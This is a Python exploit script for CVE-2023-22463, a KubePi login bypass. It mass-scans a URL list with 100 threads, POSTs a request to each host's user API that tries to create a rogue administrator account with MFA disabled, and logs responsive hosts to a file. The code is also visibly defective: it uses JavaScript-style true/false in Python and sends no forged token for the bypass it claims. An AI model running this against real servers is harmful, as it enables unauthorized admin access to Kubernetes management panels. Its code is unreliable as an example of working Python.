import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """______ __      ______      _____________    _________         _________________        ______ __             
___  //_/___  ____  /_________  __ \__(_)   ______  /__      ___  /__  ___/__(_)______ ___  //_/_________  __
__  ,<  _  / / /_  __ \  _ \_  /_/ /_  /    ___ _  /__ | /| / /  __/____ \__  /__  __ `/_  ,<  _  _ \_  / / /
_  /| | / /_/ /_  /_/ /  __/  ____/_  /     / /_/ / __ |/ |/ // /_ ____/ /_  / _  /_/ /_  /| | /  __/  /_/ / 
/_/ |_| \__,_/ /_.___/\___//_/     /_/      \____/  ____/|__/ \__/ /____/ /_/  _\__, / /_/ |_| \___/_\__, /  
                                                                               /____/               /____/   """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='KubePi JwtSigKey 登陆绕过漏洞CVE-2023-22463')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/kubepi/api/v1/users'
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36',
        'Accept':'application/json',
        'Accept-Encoding':'gzip, deflate',
        'Content-Length':'262',
    }
    json = {
        "authenticate": {
            "password": "{{randstr}}"
        },
        "email": "{{randstr}}@qq.com",
        "isAdmin": true,
        "mfa": {
                "enable": false
        },
        "name": "{{randstr}}",
        "nickName": "{{randstr}}",
        "roles": [
            "Supper User"
        ]
    }
    try:
        res = requests.post(url=target+payload,headers=headers,data=json,verify=False,timeout=10)
        if res.status_code == 200 and 'data' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == '__main__':
    main()